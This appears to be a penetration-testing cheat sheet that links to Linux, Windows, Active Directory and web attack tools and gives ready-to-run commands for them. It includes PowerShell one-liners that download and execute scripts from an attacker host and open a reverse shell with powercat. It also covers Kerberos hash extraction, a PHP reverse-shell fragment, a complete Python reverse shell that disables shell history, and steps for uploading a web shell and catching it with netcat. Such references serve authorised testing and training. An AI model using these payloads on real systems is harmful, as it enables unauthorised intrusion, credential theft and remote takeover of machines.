# Scripts
Links to useful scripts for enumeration, privilege escalation, and shell access

## Linux

### linPEAS (Enumeration, Privilege Escalation)
- **Link**: [PEASS-ng/linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
- **Download**: [linpeas.sh](https://github.com/peass-ng/PEASS-ng/releases/download/20250601-88c7a0f6/linpeas.sh)
- **Description**: Enumerates Linux system details and identifies privilege escalation opportunities.

### Example Usage (Linux)
1. Download linPEAS:
   ```bash copy
   wget https://github.com/peass-ng/PEASS-ng/releases/download/20250601-88c7a0f6/linpeas.sh
   ```
2. Make executable and run:
   ```bash copy
   chmod +x linpeas.sh
   ./linpeas.sh
   ```

## Windows

### winPEAS (Enumeration, Privilege Escalation)
- **Link**: [PEASS-ng/winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
- **Download**: [winPEAS.bat](https://github.com/peass-ng/PEASS-ng/releases/download/20250601-88c7a0f6/winPEAS.bat)
- **Description**: Enumerates Windows system details and identifies privilege escalation opportunities.

### PowerUp (Privilege Escalation)
- **Link**: [PowerSploit/PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
- **Description**: PowerShell script for identifying Windows privilege escalation vulnerabilities.

### powercat (Shell)
- **Link**: [besimorhino/powercat](https://github.com/besimorhino/powercat/blob/master/powercat.ps1)
- **Description**: PowerShell script for establishing reverse or bind shells.

### Example Usage (Windows)
1. Download PowerUp:
   ```powershell copy
   powershell (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1','PowerUp.ps1')
   ```
2. Run PowerUp:
   ```powershell copy
   . .\PowerUp.ps1
   Invoke-AllChecks
   ```
3. Download and run powercat:
   ```powershell copy
   powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.10.10:80/powercat.ps1');powercat -c 10.10.10.10 -p 1234 -e cmd"
   ```

## Active Directory

### Invoke-Kerberoast (Credential Harvesting, Privilege Escalation)
- **Link**: [EmpireProject/Invoke-Kerberoast.ps1](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1)
- **Description**: PowerShell script for extracting Kerberos ticket hashes for cracking.

### BloodHound (Enumeration, Active Directory Mapping)
- **Link**: [SpecterOps/BloodHound](https://github.com/SpecterOps/BloodHound)
- **Legacy Link**: [SpecterOps/BloodHound-Legacy](https://github.com/SpecterOps/BloodHound-Legacy)
- **Description**: Tool for mapping and analyzing Active Directory environments.

### Example Usage (Active Directory)
1. Download Invoke-Kerberoast:
   ```powershell copy
   powershell -ep bypass
   ```
   ```powershell copy
   iex(New-Object Net.WebClient).DownloadString('http://10.10.10.10:80/Invoke-Kerberoast.ps1')
   ```
2. Run Kerberoast:
   ```powershell copy
   Invoke-Kerberoast -OutputFormat hashcat | fl
   ```
3. Use BloodHound for AD enumeration (requires setup, refer to documentation).

## Web

### php-reverse-shell (Shell)
- **Link**: [pentestmonkey/php-reverse-shell](http://pentestmonkey.net/tools/php-reverse-shell)
- **Description**: PHP script for establishing a reverse shell from a web server.
- **Changes Required**: Update `$ip = '10.10.10.10'` and `$port = 1234` to match attacker’s IP and port.

```php copy
//snip
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.10.10';    // CHANGE THIS
$port = 1234;           // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
//snip
```

### Linux Reverse Shell (Shell, Web Context)
- **Description**: Python script for establishing a reverse shell, usable in web exploitation scenarios.
- **Changes Required**: Update `lhost = "10.10.10.10"` and `lport = 1234` to match attacker’s IP and port.

```python copy
import os
import pty
import socket

lhost = "10.10.10.10"   # CHANGE THIS
lport = 4444            # CHANGE THIS

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((lhost, lport))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
os.putenv("HISTFILE",'/dev/null')
pty.spawn("/bin/bash")
s.close()
```

### Example Usage (Web)
1. Start Python HTTP server to host scripts:
   ```bash copy
   python3 -m http.server 8888
   ```
2. Upload php-reverse-shell to the target:
   ```bash copy
   wget http://10.10.10.10:8888/php-reverse-shell.php -O shell.php
   ```
   ```bash copy
   curl -X POST -F "file=@shell.php" http://10.10.10.10/upload.php
   ```
3. Start a netcat listener:
   ```bash copy
   nc -lvnp 1234
   ```
4. Access the PHP shell:
   ```bash copy
   curl http://10.10.10.10/shell.php
   ```
